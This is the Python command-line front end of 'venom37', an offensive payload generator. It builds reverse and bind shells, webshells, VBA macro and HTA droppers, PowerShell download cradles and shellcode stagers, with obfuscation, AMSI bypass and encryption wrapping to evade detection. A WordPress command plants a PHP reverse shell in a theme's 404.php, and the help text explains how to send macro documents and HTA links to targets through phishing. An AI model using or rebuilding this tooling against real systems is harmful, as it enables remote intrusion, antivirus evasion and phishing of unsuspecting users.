"""CLI for venom37 -- reverse shell generator."""
from __future__ import annotations

import asyncio
import json
import sys

import click


@click.group("venom")
def venom_cli():
    """venom37 -- Reverse shell generator.

    Generate reverse shells in multiple languages with encoding options.
    Includes listener commands and shell stabilization instructions.
    """
    pass


@venom_cli.command("list")
@click.option("--human", is_flag=True, help="Human-readable output")
def list_shells(human):
    """List all available shell types."""
    from venom37.engine import Venom

    types = Venom.list_types()
    if human:
        click.echo("\n  Available Shell Types:")
        for t in types:
            click.echo(f"    {t['type']:20s} {t['name']:25s} [{t['platform']}]")
            click.echo(f"    {'':20s} {t['description']}")
            click.echo(f"    {'':20s} Requires: {t['requires']}")
            click.echo()
        click.echo("  Obfuscation Options (for gen command):")
        click.echo("    --obfuscate / -o LEVEL   Apply obfuscation (1-3)")
        click.echo("    --amsi                   Prepend AMSI bypass (PowerShell)")
        click.echo("    --encrypt TYPE           Wrap in encryption (xor, aes)")
        click.echo()
    else:
        click.echo(json.dumps(types, indent=2))


@venom_cli.command("gen")
@click.argument("shell_type")
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None, type=click.Choice(["base64", "url", "double-url"]), help="Encode the payload")
@click.option("--listener", "-l", default="nc", type=click.Choice(["nc", "socat", "pwncat", "rlwrap", "msfconsole"]), help="Listener type")
@click.option("--variant", "-V", default=None, help="Use a specific variant")
@click.option("--human", is_flag=True, help="Human-readable output")
@click.option("--explain", is_flag=True, help="Explain what the shell does")
@click.option("--with-listener", is_flag=True, help="Include listener command in output")
@click.option("--obfuscate", "-o", default=0, type=click.IntRange(0, 3), help="Obfuscation level (1-3)")
@click.option("--amsi", is_flag=True, help="Prepend AMSI bypass (PowerShell only)")
@click.option("--encrypt", default=None, type=click.Choice(["xor", "aes"]), help="Wrap payload in encryption")
def gen(shell_type, lhost, lport, encode, listener, variant, human, explain, with_listener, obfuscate, amsi, encrypt):
    """Generate a reverse shell payload.

    Examples:
      venom37 gen bash 10.0.0.1 4444
      venom37 gen php 10.0.0.1 4444 --encode base64
      venom37 gen powershell 10.0.0.1 4444 --obfuscate 2
      venom37 gen powershell 10.0.0.1 4444 --amsi --encrypt xor
      venom37 gen python 10.0.0.1 4444 --encrypt xor
    """
    from venom37.engine import Venom
    from venom37.obfuscate import Obfuscator

    try:
        shell = Venom.generate(shell_type, lhost, lport, encode=encode,
                               listener=listener, variant=variant)
    except ValueError as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)

    if explain:
        click.echo(shell.explanation)
        return

    code = shell.code
    is_ps = shell_type.startswith("powershell")
    is_py = shell_type.startswith("python")

    # Apply obfuscation
    if obfuscate > 0:
        if is_ps:
            code = Obfuscator.obfuscate_powershell(code, level=obfuscate)
        elif is_py:
            code = Obfuscator.obfuscate_python(code, level=obfuscate)
        else:
            click.echo(f"Warning: obfuscation not fully supported for {shell_type}, applying basic transforms", err=True)

    # AMSI bypass (PowerShell only)
    if amsi:
        if is_ps:
            bypass = Obfuscator.amsi_bypass(randomize=True)
            code = bypass + "\n\n" + code
        else:
            click.echo("Warning: --amsi only applies to PowerShell payloads", err=True)

    # Encryption wrapping
    if encrypt:
        if encrypt == "xor":
            if is_ps:
                code = Obfuscator.wrap_xor_powershell(code)
            elif is_py:
                code = Obfuscator.wrap_xor_python(code)
            else:
                click.echo(f"Warning: XOR wrapping not supported for {shell_type}", err=True)
        elif encrypt == "aes":
            if is_ps:
                code = Obfuscator.wrap_aes_powershell(code)
            else:
                click.echo(f"Warning: AES wrapping currently only supports PowerShell", err=True)

    shell.code = code

    if human or with_listener:
        click.echo(shell.to_human())
    else:
        click.echo(shell.to_json())


@venom_cli.command("obfuscate")
@click.argument("input_file", type=click.Path(exists=True), required=False)
@click.option("--lang", "-L", default="powershell", type=click.Choice(["powershell", "python"]), help="Language")
@click.option("--level", "-l", default=2, type=click.IntRange(1, 3), help="Obfuscation level (1-3)")
@click.option("--amsi", is_flag=True, help="Prepend AMSI bypass")
@click.option("--encrypt", default=None, type=click.Choice(["xor", "aes"]), help="Wrap in encryption")
@click.option("--stdin", "use_stdin", is_flag=True, help="Read from stdin")
@click.option("--human", is_flag=True, help="Human-readable output")
def obfuscate_cmd(input_file, lang, level, amsi, encrypt, use_stdin, human):
    """Obfuscate a payload file or stdin.

    Examples:
      venom37 obfuscate payload.ps1 --level 3
      echo 'IEX(payload)' | venom37 obfuscate --stdin --lang powershell
      venom37 obfuscate script.py --lang python --encrypt xor
    """
    from venom37.obfuscate import Obfuscator

    if use_stdin or input_file is None:
        code = sys.stdin.read()
    else:
        with open(input_file) as f:
            code = f.read()

    if not code.strip():
        click.echo("Error: empty input", err=True)
        sys.exit(1)

    if lang == "powershell":
        code = Obfuscator.obfuscate_powershell(code, level=level)
    elif lang == "python":
        code = Obfuscator.obfuscate_python(code, level=level)

    if amsi and lang == "powershell":
        bypass = Obfuscator.amsi_bypass(randomize=True)
        code = bypass + "\n\n" + code

    if encrypt == "xor":
        if lang == "powershell":
            code = Obfuscator.wrap_xor_powershell(code)
        elif lang == "python":
            code = Obfuscator.wrap_xor_python(code)
    elif encrypt == "aes":
        if lang == "powershell":
            code = Obfuscator.wrap_aes_powershell(code)

    if human:
        click.echo("\n  Obfuscated payload:")
        click.echo("  " + "=" * 60)
        for line in code.split("\n"):
            click.echo("  " + line)
        click.echo("  " + "=" * 60)
        click.echo()
    else:
        click.echo(code)


@venom_cli.command("wp-inject")
@click.option("--target", "-t", required=True, help="WordPress base URL")
@click.option("--user", "-u", required=True, help="WordPress admin username")
@click.option("--password", "-p", required=True, help="WordPress admin password")
@click.option("--lhost", required=True, help="Your IP address")
@click.option("--lport", default=4444, help="Your listener port")
@click.option("--theme", default=None, help="Theme name (auto-detected)")
@click.option("--human", is_flag=True, help="Human-readable output")
@click.option("--explain", is_flag=True, help="Explain what this will do")
def wp_inject(target, user, password, lhost, lport, theme, human, explain):
    """Inject a PHP reverse shell into a WordPress theme (requires admin creds)."""
    from venom37.engine import Venom

    if explain:
        click.echo(
            f"I'm going to:\n"
            f"  1. Log into WordPress at {target} as '{user}'\n"
            f"  2. Open the theme editor\n"
            f"  3. Replace 404.php with a PHP reverse shell connecting to {lhost}:{lport}\n"
            f"  4. Tell you the URL to visit to trigger the shell\n\n"
            f"You'll need to run 'nc -lvnp {lport}' on your machine first."
        )
        return

    result = asyncio.run(Venom.wp_inject(target, user, password, lhost, lport, theme=theme))

    if human:
        if result["success"]:
            click.echo(f"\n  \033[92m[+] Shell injected successfully!\033[0m")
            click.echo(f"  Trigger URL: {result['trigger_url']}")
            click.echo(f"  Listener:    {result['listener_cmd']}")
            click.echo(f"\n  \033[93m[i] {result['teaching']}\033[0m\n")
        else:
            click.echo(f"\n  \033[91m[-] Injection failed: {result['error']}\033[0m\n")
    else:
        click.echo(json.dumps(result, indent=2))

    sys.exit(0 if result.get("success") else 1)


# Shortcut commands
@venom_cli.command("bash", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_bash(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 bash <ip> <port>"""
    ctx.invoke(gen, shell_type="bash", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("php", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_php(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 php <ip> <port>"""
    ctx.invoke(gen, shell_type="php", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("python", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_python(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 python <ip> <port>"""
    ctx.invoke(gen, shell_type="python", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("nc", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_nc(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 nc <ip> <port>"""
    ctx.invoke(gen, shell_type="nc", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("powershell", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_powershell(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 powershell <ip> <port>"""
    ctx.invoke(gen, shell_type="powershell", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)

# === NEW CLI COMMANDS (append to cli.py) ===
# Shellcode commands

@venom_cli.group("shellcode")
def shellcode_group():
    """Shellcode encoding, formatting, and staged payload generation."""
    pass


@shellcode_group.command("encode")
@click.argument("input_file", type=click.Path(exists=True))
@click.option("--method", "-m", default="xor", type=click.Choice(["xor", "rot", "xor_additive", "null_insert", "chain"]),
              help="Encoding method")
@click.option("--key", "-k", default=None, help="Hex key for XOR (auto-generated if omitted)")
@click.option("--rot-n", default=None, type=int, help="ROT-N value (auto-generated if omitted)")
@click.option("--format", "-f", "fmt", default="python", type=click.Choice(["c", "python", "powershell", "csharp", "raw"]),
              help="Output format")
@click.option("--human", is_flag=True, help="Human-readable output")
def shellcode_encode(input_file, method, key, rot_n, fmt, human):
    """Encode shellcode from a raw file.

    Examples:
      venom37 shellcode encode payload.bin --method xor --format c
      venom37 shellcode encode payload.bin --method chain --format python
      venom37 shellcode encode payload.bin --method rot --rot-n 13
    """
    from venom37.shellcode import ShellcodeEncoder, ShellcodeFormatter

    with open(input_file, "rb") as f:
        shellcode = f.read()

    if method == "xor":
        key_bytes = bytes.fromhex(key) if key else None
        encoded, used_key = ShellcodeEncoder.xor_encode(shellcode, key_bytes)
        info = {"method": "xor", "key_hex": used_key.hex(), "original_size": len(shellcode)}
    elif method == "rot":
        encoded, n = ShellcodeEncoder.rot_encode(shellcode, rot_n)
        info = {"method": "rot", "n": n, "original_size": len(shellcode)}
    elif method == "xor_additive":
        encoded, seed = ShellcodeEncoder.xor_additive_encode(shellcode)
        info = {"method": "xor_additive", "seed": seed, "original_size": len(shellcode)}
    elif method == "null_insert":
        encoded = ShellcodeEncoder.insert_null_encode(shellcode)
        info = {"method": "null_insert", "original_size": len(shellcode)}
    elif method == "chain":
        result = ShellcodeEncoder.chain_encode(shellcode)
        click.echo(json.dumps(result, indent=2))
        return

    # Format output
    if fmt == "c":
        output = ShellcodeFormatter.to_c_array(encoded)
    elif fmt == "python":
        output = ShellcodeFormatter.to_python(encoded)
    elif fmt == "powershell":
        output = ShellcodeFormatter.to_powershell(encoded)
    elif fmt == "csharp":
        output = ShellcodeFormatter.to_csharp(encoded)
    elif fmt == "raw":
        sys.stdout.buffer.write(encoded)
        return

    if human:
        click.echo("\n  Encoding: " + json.dumps(info))
        click.echo("  Encoded size: " + str(len(encoded)) + " bytes")
        click.echo("  " + "=" * 60)
        click.echo(output)
        click.echo()
    else:
        click.echo(json.dumps({"info": info, "formatted": output}, indent=2))


@shellcode_group.command("format")
@click.argument("input_file", type=click.Path(exists=True))
@click.option("--format", "-f", "fmt", default="c", type=click.Choice(["c", "python", "powershell", "csharp"]),
              help="Output format")
@click.option("--var", default="buf", help="Variable name")
def shellcode_format(input_file, fmt, var):
    """Format raw shellcode bytes for a specific language.

    Examples:
      venom37 shellcode format payload.bin --format c
      venom37 shellcode format payload.bin --format python --var shellcode
    """
    from venom37.shellcode import ShellcodeFormatter

    with open(input_file, "rb") as f:
        shellcode = f.read()

    if fmt == "c":
        click.echo(ShellcodeFormatter.to_c_array(shellcode, var))
    elif fmt == "python":
        click.echo(ShellcodeFormatter.to_python(shellcode, var))
    elif fmt == "powershell":
        click.echo(ShellcodeFormatter.to_powershell(shellcode, "$" + var))
    elif fmt == "csharp":
        click.echo(ShellcodeFormatter.to_csharp(shellcode, var))


@shellcode_group.command("stager")
@click.argument("server_url")
@click.option("--lang", "-l", default="python", type=click.Choice(["python", "powershell", "bash", "c"]),
              help="Stager language")
@click.option("--path", default="/stage", help="Stage download path")
@click.option("--human", is_flag=True, help="Human-readable output")
def shellcode_stager(server_url, lang, path, human):
    """Generate a staged payload stager.

    The stager downloads and executes the full payload from your server.

    Examples:
      venom37 shellcode stager https://10.0.0.1:8443 --lang python
      venom37 shellcode stager https://10.0.0.1:8443 --lang powershell
    """
    from venom37.shellcode import StagedPayload

    if lang == "python":
        code = StagedPayload.python_stager(server_url, path)
    elif lang == "powershell":
        code = StagedPayload.powershell_stager(server_url, path)
    elif lang == "bash":
        code = StagedPayload.bash_stager(server_url, path)
    elif lang == "c":
        code = StagedPayload.c_stager_template(server_url, path)

    if human:
        click.echo("\n  Staged Payload Stager (" + lang + ")")
        click.echo("  Server: " + server_url + path)
        click.echo("  " + "=" * 60)
        click.echo(code)
        click.echo()
    else:
        click.echo(json.dumps({"language": lang, "server": server_url, "path": path, "code": code}, indent=2))


@shellcode_group.command("msfvenom")
@click.argument("lhost")
@click.argument("lport", type=int)
@click.option("--platform", "-p", default="windows/x64", help="Target platform")
def shellcode_msfvenom(lhost, lport, platform):
    """Show msfvenom commands for generating shellcode.

    Examples:
      venom37 shellcode msfvenom 10.0.0.1 4444
      venom37 shellcode msfvenom 10.0.0.1 4444 --platform linux/x64
    """
    from venom37.shellcode import ShellcodeGenerator

    info = ShellcodeGenerator.reverse_shell_info(lhost, lport, platform)
    click.echo(json.dumps(info, indent=2))


# Weaponization commands

@venom_cli.group("weapon")
def weapon_group():
    """Weaponized payload generation -- macros, HTA, WSH, PowerShell delivery."""
    pass


@weapon_group.command("macro")
@click.argument("lhost")
@click.argument("lport", type=int)
@click.option("--method", "-m", default="powershell", type=click.Choice(["powershell", "cmd", "wscript"]),
              help="Delivery method")
@click.option("--type", "-t", "doc_type", default="word", type=click.Choice(["word", "excel"]),
              help="Document type")
@click.option("--human", is_flag=True, help="Human-readable output")
def weapon_macro(lhost, lport, method, doc_type, human):
    """Generate a VBA macro reverse shell for Word/Excel.

    Examples:
      venom37 weapon macro 10.0.0.1 4444
      venom37 weapon macro 10.0.0.1 4444 --type excel
      venom37 weapon macro 10.0.0.1 4444 --method wscript
    """
    from venom37.weaponize import MacroGenerator

    if doc_type == "excel":
        code = MacroGenerator.excel_reverse_shell(lhost, lport)
    else:
        code = MacroGenerator.reverse_shell(lhost, lport, method)

    if human:
        click.echo("\n  VBA Macro Reverse Shell (" + doc_type + "/" + method + ")")
        click.echo("  Target: " + lhost + ":" + str(lport))
        click.echo("  " + "=" * 60)
        click.echo(code)
        click.echo("\n  Instructions:")
        click.echo("  1. Start listener: nc -lvnp " + str(lport))
        click.echo("  2. Open Word/Excel > Alt+F11 > Insert Module")
        click.echo("  3. Paste the macro code")
        click.echo("  4. Save as .docm/.xlsm (macro-enabled)")
        click.echo("  5. Send to target and wait for them to open it")
        click.echo()
    else:
        click.echo(json.dumps({"type": "vba_macro", "doc_type": doc_type, "method": method,
                               "lhost": lhost, "lport": lport, "code": code}, indent=2))


@weapon_group.command("hta")
@click.argument("lhost")
@click.argument("lport", type=int)
@click.option("--human", is_flag=True, help="Human-readable output")
def weapon_hta(lhost, lport, human):
    """Generate an HTA dropper with reverse shell.

    Examples:
      venom37 weapon hta 10.0.0.1 4444
    """
    from venom37.weaponize import HTAGenerator

    code = HTAGenerator.reverse_shell(lhost, lport)

    if human:
        click.echo("\n  HTA Reverse Shell Dropper")
        click.echo("  Target: " + lhost + ":" + str(lport))
        click.echo("  " + "=" * 60)
        click.echo(code)
        click.echo("\n  Delivery:")
        click.echo("  1. Host this .hta file on your web server")
        click.echo("  2. Send link to target: mshta http://YOUR_IP/payload.hta")
        click.echo("  3. Or embed in phishing email")
        click.echo()
    else:
        click.echo(json.dumps({"type": "hta", "lhost": lhost, "lport": lport, "code": code}, indent=2))


@weapon_group.command("wsh")
@click.argument("lhost")
@click.argument("lport", type=int)
@click.option("--lang", "-l", default="vbs", type=click.Choice(["vbs", "js"]),
              help="Script language")
@click.option("--human", is_flag=True, help="Human-readable output")
def weapon_wsh(lhost, lport, lang, human):
    """Generate a Windows Script Host payload (.vbs/.js).

    Examples:
      venom37 weapon wsh 10.0.0.1 4444
      venom37 weapon wsh 10.0.0.1 4444 --lang js
    """
    from venom37.weaponize import WSHGenerator

    if lang == "vbs":
        code = WSHGenerator.vbs_reverse_shell(lhost, lport)
        ext = ".vbs"
    else:
        code = WSHGenerator.js_reverse_shell(lhost, lport)
        ext = ".js"

    if human:
        click.echo("\n  WSH Reverse Shell (" + lang + ")")
        click.echo("  Save as: payload" + ext)
        click.echo("  " + "=" * 60)
        click.echo(code)
        click.echo("\n  Execute: wscript payload" + ext + " (or cscript)")
        click.echo()
    else:
        click.echo(json.dumps({"type": "wsh", "lang": lang, "ext": ext, "code": code}, indent=2))


@weapon_group.command("psh-cradle")
@click.argument("url")
@click.option("--obfuscate", "-o", is_flag=True, help="Apply string splitting obfuscation")
@click.option("--human", is_flag=True, help="Human-readable output")
def weapon_psh_cradle(url, obfuscate, human):
    """Generate a PowerShell download cradle.

    Examples:
      venom37 weapon psh-cradle http://10.0.0.1/shell.ps1
      venom37 weapon psh-cradle http://10.0.0.1/shell.ps1 --obfuscate
    """
    from venom37.weaponize import PowerShellDelivery

    if obfuscate:
        code = PowerShellDelivery.download_cradle_obfuscated(url)
    else:
        code = PowerShellDelivery.download_cradle(url)

    if human:
        click.echo("\n  PowerShell Download Cradle")
        click.echo("  " + "=" * 60)
        click.echo(code)
        click.echo()
    else:
        click.echo(code)


# Bind shell commands

@venom_cli.command("bind")
@click.argument("shell_type")
@click.argument("lport", type=int, default=4444)
@click.option("--rhost", default=None, help="Target IP (for connect command)")
@click.option("--human", is_flag=True, help="Human-readable output")
def bind_shell(shell_type, lport, rhost, human):
    """Generate a bind shell payload.

    Available types: nc-bind, nc-mkfifo-bind, python-bind, socat-bind,
    socat-encrypted-bind, powershell-bind

    Examples:
      venom37 bind nc-bind 4444
      venom37 bind python-bind 4444 --rhost 10.0.0.5 --human
      venom37 bind socat-encrypted-bind 53 --human
    """
    from venom37.bind_shells import BIND_SHELLS

    if shell_type == "list" or shell_type not in BIND_SHELLS:
        click.echo("\n  Available bind shells:")
        for key, info in BIND_SHELLS.items():
            click.echo("    " + key.ljust(25) + info["name"] + " [" + info["platform"] + "]")
        if shell_type != "list":
            click.echo("\n  Unknown type: " + shell_type)
        return

    info = BIND_SHELLS[shell_type]
    target_cmd = info["target_cmd"].format(lport=lport)
    connect_cmd = info["connect_cmd"].format(rhost=rhost or "TARGET_IP", lport=lport)

    if human:
        click.echo("\n  " + info["name"])
        click.echo("  " + "=" * 60)
        click.echo("  Platform: " + info["platform"])
        click.echo("  Requires: " + info["requires"])
        click.echo("\n  [1] On target:")
        click.echo("  " + target_cmd)
        click.echo("\n  [2] Connect from attacker:")
        click.echo("  " + connect_cmd)
        click.echo("\n  " + info["description"])
        click.echo()
    else:
        click.echo(json.dumps({
            "type": shell_type, "name": info["name"],
            "target_cmd": target_cmd, "connect_cmd": connect_cmd,
            "platform": info["platform"], "requires": info["requires"],
        }, indent=2))


@venom_cli.command("webshell")
@click.argument("shell_type", default="list")
@click.option("--human", is_flag=True, help="Human-readable output")
def webshell(shell_type, human):
    """Generate webshell payloads.

    Available: php-simple, php-system, php-passthru, php-stealth,
    aspx-simple, jsp-simple

    Examples:
      venom37 webshell php-simple
      venom37 webshell php-stealth --human
      venom37 webshell aspx-simple
    """
    from venom37.bind_shells import WEBSHELLS

    if shell_type == "list" or shell_type not in WEBSHELLS:
        click.echo("\n  Available webshells:")
        for key, info in WEBSHELLS.items():
            click.echo("    " + key.ljust(20) + info["name"] + " [" + info["platform"] + "]")
        if shell_type != "list":
            click.echo("\n  Unknown type: " + shell_type)
        return

    info = WEBSHELLS[shell_type]
    if human:
        click.echo("\n  " + info["name"])
        click.echo("  " + "=" * 60)
        click.echo(info["code"])
        click.echo("\n  Usage: " + info["usage"])
        click.echo("  " + info["description"])
        click.echo()
    else:
        click.echo(json.dumps(info, indent=2))
